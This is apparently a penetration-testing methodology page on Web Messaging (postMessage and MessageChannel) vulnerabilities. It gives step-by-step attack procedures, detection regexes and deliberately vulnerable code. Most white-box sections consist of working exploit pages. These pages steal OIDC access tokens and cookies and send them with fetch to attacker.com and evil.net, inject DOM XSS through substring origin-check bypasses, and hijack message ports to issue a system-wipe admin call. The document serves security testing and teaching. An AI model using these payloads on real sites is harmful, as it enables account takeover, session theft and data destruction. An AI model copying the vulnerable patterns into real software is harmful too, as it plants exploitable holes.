# Web Messaging

## Check List

## Methodology

### Black Box

#### Missing Origin Validation in postMessage Listener

{% stepper %}
{% step %}
Open the application in browser
{% endstep %}

{% step %}
Inspect JavaScript files for message event listeners

```js
window.addEventListener("message", function(event){
   processMessage(event.data);
});
```
{% endstep %}

{% step %}
Verify whether origin validation is implemented

```js
if(event.origin !== "https://trusted.com") return;
```
{% endstep %}

{% step %}
If no origin check exists, listener accepts messages from any domain
{% endstep %}

{% step %}
Login to your account, Open browser console and send crafted message manually

```js
window.postMessage({action:"changeEmail",email:"attacker@test.com"},"*");
```
{% endstep %}

{% step %}
If application processes message without validating origin, improper Web Messaging validation exists, Create external PoC page

```html
<html>
<body>
<iframe id="target" src="https://target.com"></iframe>
<script>
setTimeout(function(){
 document.getElementById("target").contentWindow.postMessage(
   {action:"changeEmail",email:"attacker@test.com"},
   "*"
 );
},3000);
</script>
</body>
</html>
```
{% endstep %}

{% step %}
Host the PoC on attacker domain
{% endstep %}

{% step %}
Open PoC while authenticated to target.com, If sensitive action is executed, missing origin validation in Web Messaging is confirmed
{% endstep %}
{% endstepper %}

***

#### Wildcard Target Origin Usage

{% stepper %}
{% step %}
Inspect application JavaScript for outgoing postMessage calls

```js
otherWindow.postMessage({token:authToken},"*");
```
{% endstep %}

{% step %}
If target origin is set to `"*"`, sensitive data may be exposed
{% endstep %}

{% step %}
Create malicious page embedding target application via iframe

```html
<iframe id="victim" src="https://target.com"></iframe>
<script>
window.addEventListener("message",function(e){
   console.log("Leaked data:",e.data);
});
</script>
```
{% endstep %}

{% step %}
If target application sends authentication token or sensitive information via postMessage with wildcard origin, data leakage occurs
{% endstep %}

{% step %}
If attacker page receives sensitive data without restriction, Web Messaging misconfiguration is confirmed
{% endstep %}
{% endstepper %}

***

#### Insecure Message Handling Leading to DOM XSS

{% stepper %}
{% step %}
Inspect message handler logic

```js
window.addEventListener("message",function(e){
   document.getElementById("output").innerHTML = e.data;
});
```
{% endstep %}

{% step %}
If message data is written directly to DOM without sanitization, XSS risk exists
{% endstep %}

{% step %}
Login and open console and Send malicious message

```js
window.postMessage('<img src=x onerror=alert(1)>',"*");
```
{% endstep %}

{% step %}
If JavaScript executes in application context, DOM-based XSS via Web Messaging is confirmed
{% endstep %}

{% step %}
Create external PoC page sending malicious payload through iframe
{% endstep %}

{% step %}
If payload executes while victim is authenticated, stored or reflected DOM XSS through Web Messaging is confirmed
{% endstep %}
{% endstepper %}

***

#### Privilege Escalation via Message Parameter Manipulation

{% stepper %}
{% step %}
Inspect message listener controlling role or state:

```js
window.addEventListener("message",function(e){
   if(e.data.role){
      user.role = e.data.role;
   }
});
```
{% endstep %}

{% step %}
Open console and send manipulated role

```js
window.postMessage({role:"admin"},"*");
```
{% endstep %}

{% step %}
Attempt to access admin endpoint

```http
GET /api/admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
If server trusts client-side role modified via message event and grants privileged access, integrity control through Web Messaging is broken
{% endstep %}

{% step %}
If unauthorized privilege escalation occurs due to unvalidated postMessage data, Web Messaging vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Session Exfiltration via Wildcard (\*) Target Origin Broadcast in Silent OIDC Iframes

{% stepper %}
{% step %}
Map the entire target system using Burp Suite and browser Developer Tools. Focus on modern Single Page Applications (SPAs) that utilize OpenID Connect (OIDC) or OAuth 2.0 for authentication
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Analyze the token lifecycle. Access tokens (JWTs) expire quickly (e.g., every 15 minutes). To prevent the user from being interrupted with a login prompt every 15 minutes, the SPA implements a "Silent Renew" sequence
{% endstep %}

{% step %}
Investigate the Silent Renew execution. The frontend dynamically creates a hidden `<iframe>` pointing to the Identity Provider's (IdP) authorization endpoint (e.g., `/authorize?prompt=none`). If the user has an active session cookie with the IdP, the IdP instantly redirects the iframe back to an enterprise callback URL (e.g., `[https://spa.enterprise.tld/silent-renew.html](https://spa.enterprise.tld/silent-renew.html)`) containing the new JWT in the URL fragment
{% endstep %}

{% step %}
Identify the Cross-Window Communication mechanism. The hidden iframe must transmit the newly minted JWT back to the main SPA window. It achieves this using the HTML5 Web Messaging API: `window.parent.postMessage({ token: newJwt }, targetOrigin)`
{% endstep %}

{% step %}
Discover the fatal configuration flaw: The developer explicitly configures the `targetOrigin` as the wildcard `*`
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumes that because the `silent-renew.html` file is hosted on `spa.enterprise.tld`, and the main SPA has strict `X-Frame-Options: DENY` headers, the parent window will _always_ be the legitimate enterprise SPA. They fail to realize that `X-Frame-Options` is evaluated on a per-URL basis
{% endstep %}

{% step %}
Discover the bounding box vulnerability: The developer forgot to apply the `X-Frame-Options: DENY` header to the static `silent-renew.html` file itself, rendering it frameable
{% endstep %}

{% step %}
Formulate the Token Exfiltration payload. You must construct a malicious webpage, embed the target's `silent-renew.html` inside an iframe, and listen for the wildcard broadcast
{% endstep %}

{% step %}
Construct the payload: `<iframe src="[https://spa.enterprise.tld/silent-renew.html?access_token=eyJhb](https://spa.enterprise.tld/silent-renew.html?access_token=eyJhb)..."></iframe>`. Or, better yet, initiate the actual IdP silent renew flow within the iframe to mint a fresh token automatically
{% endstep %}

{% step %}
Add an event listener to your malicious parent window: `window.addEventListener('message', (e) => fetch('[https://attacker.com/leak?t=](https://attacker.com/leak?t=)' + e.data.token))`
{% endstep %}

{% step %}
Distribute the payload to a logged-in enterprise victim
{% endstep %}

{% step %}
The victim's browser loads the attacker's page. The attacker's page loads the iframe. The IdP verifies the victim's ambient cookies and redirects the iframe to `silent-renew.html` with a fresh JWT
{% endstep %}

{% step %}
The `silent-renew.html` executes `window.parent.postMessage(token, '*')`
{% endstep %}

{% step %}
Because the `targetOrigin` is `*`, the browser willingly transmits the message to the attacker's parent window. The attacker intercepts the message, effortlessly exfiltrating the victim's fresh access token and achieving complete Account Takeover

**VSCode Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
(window\.parent\.postMessage\(.*,\s*['"]\*['"]\)|top\.postMessage\(.*,\s*['"]\*['"]\)|opener\.postMessage\(.*,\s*['"]\*['"]\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
window\.parent\.postMessage\(.*,\s*['"]\*['"]\)|top\.postMessage\(.*,\s*['"]\*['"]\)|opener\.postMessage\(.*,\s*['"]\*['"]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
<!DOCTYPE html>
<html>
<head>
    <title>Silent Auth Callback</title>
</head>
<body>
    <script>
        // [1]
        // [2]
        // Extracts the newly minted JWT from the URL hash fragment
        const hash = window.location.hash.substring(1);
        const params = new URLSearchParams(hash);
        const token = params.get('access_token');

        if (token) {
            // [3]
            // [4]
            // Fatal flaw: Broadcasts the highly sensitive token to ANY parent window.
            // The developer incorrectly relies on the assumption that this file 
            // cannot be framed by external domains.
            window.parent.postMessage(
                { type: 'AUTH_SUCCESS', token: token }, 
                '*' // The wildcard targetOrigin
            );
        }
    </script>
</body>
</html>
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies on hidden iframes to facilitate frictionless, invisible token rotation against a central Identity Provider, \[2] The callback file extracts the sensitive authentication artifact directly from the browser's navigation context, \[3] The architecture dictates that the child frame must pass the state back up to the parent Single Page Application, \[4] The execution sink. The developer explicitly commands the browser to disregard the origin of the parent window by setting `targetOrigin` to `*`. Because the backend engineers omitted framing protections (`X-Frame-Options` or `CSP: frame-ancestors`) on this specific static HTML asset, an attacker can arbitrarily embed it. When the victim accesses the attacker's page, the browser dutifully executes the silent auth flow, mints a valid token, and blindly blasts it into the attacker's hostile parent context

```html
<!-- Hosted at https://attacker.com/exploit.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Enterprise Promotion</title>
</head>
<body>
    <h1>Checking your eligibility...</h1>

    <!-- 1. The attacker frames the IdP authorization endpoint to trigger the silent flow. -->
    <!-- The IdP verifies the victim's session cookie and redirects this iframe to silent-renew.html -->
    <iframe 
        id="auth-frame" 
        style="display:none;" 
        src="https://idp.enterprise.com/authorize?client_id=123&response_type=token&prompt=none&redirect_uri=https://spa.enterprise.tld/silent-renew.html">
    </iframe>

    <script>
        // 2. The attacker establishes a global message listener to catch the wildcard broadcast.
        window.addEventListener('message', function(event) {
            
            // 3. The attacker intercepts the message originating from the silent-renew.html iframe.
            if (event.data && event.data.type === 'AUTH_SUCCESS') {
                const stolenToken = event.data.token;
                
                // 4. Exfiltrate the token to the attacker's command and control server.
                fetch('https://attacker.com/leak', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ jwt: stolenToken })
                });
            }
        }, false);
    </script>
</body>
</html>
```
{% endstep %}

{% step %}
To deliver seamless user sessions without repetitive login friction, engineers architected an invisible background token renewal pipeline using nested iframes. This design required cross-window communication to ferry the minted tokens from the callback context to the primary application context. The security failure stemmed from a complete breakdown in target verification. By supplying the wildcard `*` to the `postMessage` API, developers delegated the responsibility of framing prevention entirely to the HTTP transport layer. However, because static assets (like `silent-renew.html`) often bypass traditional API Gateway middleware, the protective HTTP headers (`X-Frame-Options`) were omitted. The attacker exploited this by framing the silent flow within a hostile origin. The victim's browser silently requested the token, received it, and executed the developer's exact instructions—blindly transmitting the cryptographic authentication key directly to the unauthorized, framing parent window
{% endstep %}
{% endstepper %}

***

#### Remote Code Execution via Unanchored Origin Validation and Dynamic Component Instantiation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on platforms offering rich embedded widgets, such as Customer Support Chatbots, Interactive Dashboards, or third-party CRM integrations that load an enterprise iframe within an external host page
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the JavaScript inside the embedded enterprise iframe
{% endstep %}

{% step %}
Identify the "Event-Driven Widget" architecture. The external host page must control the behavior of the iframe (e.g., passing user metadata, changing the UI theme, or resizing the widget). Because the iframe sits on the enterprise domain (e.g., `widget.enterprise.tld`) and the host sits on a customer's domain, they must communicate via `postMessage`
{% endstep %}

{% step %}
Investigate the Origin Validation logic within the iframe's `message` event listener. Because the widget must accept messages from thousands of authorized customer domains, the developer cannot use absolute equality (`===`)
{% endstep %}

{% step %}
Analyze the Regex / Substring implementation. To authorize incoming commands, the developer verifies the sender's origin using a loose substring check (e.g., `event.origin.includes('trusted-client.com')` or `event.origin.indexOf('trusted') !== -1`)
{% endstep %}

{% step %}
Discover the fatal parser logic: The developer incorrectly assumes that the presence of a trusted string mathematically guarantees ownership. They fail to recognize that an attacker can register `[https://trusted-client.com.attacker.net](https://trusted-client.com.attacker.net)` or simply use a subdomain `[https://attacker.trusted-client.com](https://attacker.trusted-client.com)` (if wildcard validation is too loose)
{% endstep %}

{% step %}
Locate the Payload Execution Sink. Once the message passes the flawed origin validation, the iframe parses the `event.data`. To support advanced configuration, the widget dynamically generates DOM elements or evaluates framework templates (Vue/Angular) based on the received payload (e.g., `element.innerHTML = event.data.customHtml` or rendering a dynamic Vue component)
{% endstep %}

{% step %}
Formulate the DOM XSS payload. Register a domain that successfully bypasses the substring validation
{% endstep %}

{% step %}
Host an attacker-controlled page on the malicious domain. Embed the enterprise widget iframe
{% endstep %}

{% step %}
Construct a payload leveraging the backend's dynamic rendering sink. E.g., `iframe.contentWindow.postMessage({ action: "UPDATE_UI", customHtml: "<img src=x onerror=alert(document.cookie)>" }, "*")`
{% endstep %}

{% step %}
The victim visits the attacker's domain. The attacker's page executes the `postMessage`
{% endstep %}

{% step %}
The enterprise iframe receives the message. It extracts the `origin` (`[https://trusted-client.com.attacker.net](https://trusted-client.com.attacker.net)`)
{% endstep %}

{% step %}
The unanchored origin check evaluates to `true` because the substring exists
{% endstep %}

{% step %}
The enterprise iframe consumes the malicious `event.data` and plunges it into the `innerHTML` or framework compilation sink. The attacker achieves complete DOM XSS within the context of the highly privileged enterprise widget

**VSCode Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
if\s*\(\s*event\.origin\.includes\(['"][a-zA-Z0-9.-]+['"]\)\s*\)|if\s*\(\s*event\.origin\.indexOf\(['"][a-zA-Z0-9.-]+['"]\)\s*!==\s*-1\s*\)|if\s*\(\s*event\.origin\.match\(['"][a-zA-Z0-9.-]+['"]\)\s*\)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
if\s*\(\s*event\.origin\.includes\(['"][a-zA-Z0-9.-]+['"]\)\s*\)|if\s*\(\s*event\.origin\.indexOf\(['"][a-zA-Z0-9.-]+['"]\)\s*!==\s*-1\s*\)|if\s*\(\s*event\.origin\.match\(['"][a-zA-Z0-9.-]+['"]\)\s*\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
window.addEventListener('message', function(event) {
    // [1]
    // [2]
    // The developer attempts to restrict commands to authorized SaaS tenants.
    // [3]
    // [4]
    // Fatal Flaw: The string "indexOf" or "includes" check is unanchored.
    // It verifies substring existence, not absolute protocol/domain structure.
    if (event.origin.indexOf('enterprise-tenant.com') === -1) {
        console.warn("Unauthorized origin.");
        return;
    }

    try {
        const payload = JSON.parse(event.data);

        // State Mutation Sink
        if (payload.action === 'CONFIGURE_WIDGET') {
            
            // The iframe dynamically applies the payload to the DOM.
            // Because the origin was "verified", the developer assumes the data is safe.
            const header = document.getElementById('widget-header');
            
            // Absolute Execution Sink (DOM XSS)
            header.innerHTML = payload.config.headerHtml;
            
            applyTheme(payload.config.themeColors);
        }
    } catch (e) {
        // Handle parsing error
    }
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture delivers an embeddable enterprise widget that requires dynamic orchestration from its host page across a massive, decentralized customer base, \[2] To prevent arbitrary websites from commanding the enterprise widget (and executing CSRF), developers implement an event listener with an explicit origin validation checkpoint, \[3] Because the list of authorized customer domains is vast and dynamic, developers avoid strict equality mapping, opting for flexible substring heuristics, \[4] The execution sink. The developers conflated substring presence with cryptographic domain validation. By ignoring URI anchors (`^` and `$`), they authored a validation algorithm that authorizes _any_ domain structurally encompassing the target string. The attacker registers a hierarchical permutation (e.g., appending `.evil.net`) that mathematically satisfies the check. Once the gate is bypassed, the widget implicitly trusts the payload, plunging the attacker's un-sanitized HTML directly into the active DOM, completely subverting the widget's internal execution perimeter

```html
<!-- Hosted on an attacker-controlled domain designed to bypass the unanchored check: -->
<!-- https://enterprise-tenant.com.evil.net/exploit.html -->

<!DOCTYPE html>
<html>
<head>
    <title>Malicious Host Page</title>
</head>
<body>
    <!-- 1. Embed the target enterprise widget -->
    <iframe id="target-widget" src="https://widget.enterprise.tld/chatbot"></iframe>

    <script>
        const targetFrame = document.getElementById('target-widget');

        targetFrame.onload = function() {
            
            // 2. Construct a malicious payload targeting the widget's configuration RPC.
            const exploitPayload = JSON.stringify({
                action: 'CONFIGURE_WIDGET',
                config: {
                    // 3. Inject an XSS vector into the dynamically rendered HTML property
                    headerHtml: "<img src=x onerror=\"fetch('https://evil.net/leak?c=' + document.cookie)\">",
                    themeColors: "blue"
                }
            });

            // 4. Dispatch the message across the boundary.
            // The origin of THIS window is "https://enterprise-tenant.com.evil.net".
            targetFrame.contentWindow.postMessage(exploitPayload, 'https://widget.enterprise.tld');
        };
    </script>
</body>
</html>
```
{% endstep %}

{% step %}
To facilitate complex, bi-directional interaction between enterprise components and external customer portals, engineers deployed Web Messaging RPC channels. Security architects mandated origin validation to restrict command authority to authorized tenants. The systemic failure occurred during the algorithmic translation of this mandate. Developers implemented loose string-matching operators instead of rigorous, anchored URI parsing. The attacker exploited DNS hierarchy by registering a domain that perfectly satisfied the mathematical substring condition while remaining entirely under hostile control. Operating from this spoofed origin, the attacker transmitted malicious commands into the widget. The widget, falsely certifying the sender's origin, escalated the data's trust tier and interpolated the payload directly into a critical DOM execution sink. This architectural manipulation effectively converted a rigid defense matrix into a wide-open conduit for Cross-Site Scripting
{% endstep %}
{% endstepper %}

***

#### Authorization Bypass via Transitive Trust in MessageChannel Port Delegation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on extremely complex web architectures involving micro-frontends (MFEs), nested cross-origin iframes, or integrated ecosystems where an enterprise "Master" application coordinates multiple isolated child applications
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the HTML5 Channel Messaging API (`MessageChannel`) implementations
{% endstep %}

{% step %}
Identify the "High-Speed Pipeline" architecture. Sending thousands of messages per second using standard `window.postMessage` requires the browser to deeply inspect the origin of every single message. To optimize CPU overhead, engineers utilize the `MessageChannel` API
{% endstep %}

{% step %}
Investigate the Handshake phase. The Master window creates a `new MessageChannel()`. It establishes an event listener on `port1`. It uses standard `postMessage` to transmit `port2` to a trusted Child iframe (e.g., `child.postMessage("INIT", "[https://trusted-child.com](https://trusted-child.com)", [channel.port2])`)
{% endstep %}

{% step %}
Analyze the Port Execution paradigm. The Master window assumes that because it strictly validated the target origin during the _initial_ transmission of `port2`, any message subsequently arriving on `port1` is mathematically guaranteed to originate from `[https://trusted-child.com](https://trusted-child.com)`
{% endstep %}

{% step %}
Discover the fatal Context Delegation vulnerability: HTML5 `MessagePort` objects are transferable capabilities. They are bound to the object reference, not the origin. If `[https://trusted-child.com](https://trusted-child.com)` accidentally (or maliciously) passes `port2` to a completely different window, the trust is transitively delegated
{% endstep %}

{% step %}
Understand the exploit chain: An attacker does not need to compromise the Master window directly. The attacker only needs to find an Open Redirect, a reflected XSS, or an insecure `postMessage` relay within the _trusted child domain_
{% endstep %}

{% step %}
Formulate the Transitive Port Hijacking payload
{% endstep %}

{% step %}
Construct an attacker-controlled parent page. Embed the `trusted-child.com` application, leveraging a secondary flaw (e.g., an XSS vulnerability on a low-value marketing sub-domain that matches the Master's wildcard trust, or manipulating a vulnerable message relay script)
{% endstep %}

{% step %}
The attacker's script running within the trusted context intercepts the Master's initialization message and extracts the `port2` object
{% endstep %}

{% step %}
The attacker's script immediately calls `window.top.postMessage("STOLEN_PORT", "*", [port2])`, transferring the port object across the boundary to the attacker's external, hostile window
{% endstep %}

{% step %}
The attacker's window receives `port2` and binds an event listener
{% endstep %}

{% step %}
The attacker now possesses a direct, zero-validation communication pipeline to the Master window. The attacker executes `port2.postMessage({ action: "WIPE_DATABASE" })`
{% endstep %}

{% step %}
The Master window receives the message on `port1`. Because the Master explicitly relies on the "un-forgeable" nature of the port reference established during the initial handshake, it omits all subsequent runtime origin checks. The destructive payload evaluates instantly, achieving catastrophic architectural bypass via delegated capability hijacking

**VSCode Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
new\s+MessageChannel\(\)|e\.ports\[0\]\.onmessage\s*=|e\.ports\[0\]\.postMessage|window\.addEventListener\(['"]message['"],\s*\(?e\)?\s*=>\s*\{\s*if\s*\(e\.ports
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
new\s+MessageChannel\(\)|e\.ports\[0\]\.onmessage\s*=|e\.ports\[0\]\.postMessage|window\.addEventListener\(['"]message['"],\s*\(?e\)?\s*=>\s*\{\s*if\s*\(e\.ports
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
// [1]
// [2]
// The Master app initializes a dedicated pipeline to avoid repetitive origin parsing
const channel = new MessageChannel();

// [3]
// [4]
// Fatal Assumption: The Master explicitly trusts ALL messages arriving on this port.
// It assumes that because port2 was originally sent to a trusted domain, 
// port2 cannot physically exist outside of that trusted domain.
channel.port1.onmessage = function(event) {
    const payload = event.data;
    
    // Critical execution without verifying event.origin (which is null/undefined on MessagePorts anyway)
    if (payload.action === 'ADMIN_API_CALL') {
        executeAuthenticatedRequest(payload.endpoint, payload.data);
    }
};

const childFrame = document.getElementById('trusted-child-app');

childFrame.onload = () => {
    // Initiates the handshake, passing the transferable port capability
    childFrame.contentWindow.postMessage(
        { command: 'INIT_PIPELINE' }, 
        'https://trusted-subdomain.enterprise.tld', 
        [channel.port2]
    );
};
```

```java
window.addEventListener('message', function(event) {
    // The child app attempts to accept the port
    if (event.data.command === 'INIT_PIPELINE' && event.ports.length > 0) {
        const port = event.ports[0];
        
        // Secondary flaw: The child app accidentally relays the port to an attacker,
        // or the attacker executed an XSS here and wrote their own listener to steal it.
        window.top.postMessage("PORT_HIJACKED", "*", [port]); 
    }
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture coordinates immense data transfer across isolated execution contexts (iframes) using the high-performance HTML5 Channel Messaging API, \[2] The master application establishes the `MessageChannel` and transmits one end of the pipe (`port2`) to the child application, utilizing standard `postMessage` targeting a rigorous, trusted origin, \[3] The architecture replaces stateless origin verification with stateful capability derivation. The application binds trust to the physical memory reference of the `MessagePort,` \[4] The execution sink. The developers fundamentally misunderstood the transferability mechanics of `MessagePort` objects. A port is a capability; whoever holds the reference holds the authority. If an attacker exploits a low-severity flaw (like an open redirect or reflected XSS on an isolated marketing sub-domain) within the "trusted" perimeter, they can intercept the initial handshake. By re-transferring the `MessagePort` back to their own hostile top-level window, the attacker severs the port from its intended origin. The Master window, blind to this transfer, continues listening to its end of the pipe, indiscriminately evaluating all incoming hostile RPC commands under its highly privileged administrative context

```html
<!-- Hosted on attacker.com/exploit.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Transitive Port Hijacking</title>
</head>
<body>
    <!-- 1. The attacker embeds the Master app. -->
    <iframe id="master" src="https://app.enterprise.tld/admin"></iframe>
    
    <!-- 2. The attacker embeds a vulnerable endpoint on the trusted subdomain. -->
    <!-- Assume the attacker found a Reflected XSS here to execute their port-theft payload -->
    <iframe id="child" src="https://trusted-subdomain.enterprise.tld/vulnerable?xss=<script>window.addEventListener('message',e=>{if(e.ports.length)window.top.postMessage('STOLEN','*',[e.ports[0]])})</script>"></iframe>

    <script>
        // 3. The attacker's top window listens for the stolen port.
        window.addEventListener('message', function(event) {
            if (event.data === 'STOLEN' && event.ports.length > 0) {
                
                // 4. The attacker successfully acquires the Master's highly trusted pipeline port.
                const stolenPort = event.ports[0];
                
                console.log("Port hijacked. Commencing unauthorized RPC execution.");
                
                // 5. The attacker dispatches administrative commands directly into the Master.
                // The Master evaluates these immediately without origin checks.
                stolenPort.postMessage({
                    action: 'ADMIN_API_CALL',
                    endpoint: '/api/v1/system/wipe',
                    data: { confirm: true }
                });
            }
        });
    </script>
</body>
</html>
```
{% endstep %}

{% step %}
To eradicate the CPU overhead of repetitive cryptographic or origin validation during high-frequency inter-frame communication, software architects integrated HTML5 `MessageChannels`. This optimization transitioned the security paradigm from declarative origin verification to transitive capability delegation. The systemic flaw arose because developers assumed that transferring a `MessagePort` to a trusted origin permanently locked that port within that domain's boundaries. They failed to recognize that a `MessagePort` behaves like a bearer token; it can be endlessly re-transferred across disparate execution contexts. The attacker subverted this architecture by exploiting a peripheral vulnerability within the trusted boundary to intercept the initial handshake. By extracting the port object and physically transmitting it out of the trusted domain and into hostile territory, the attacker established an un-sanitized, bi-directional capability tunnel. The master application, anchored to its capability-based trust assumption, obediently processed the attacker's hostile payloads, yielding total administrative execution hijacking
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
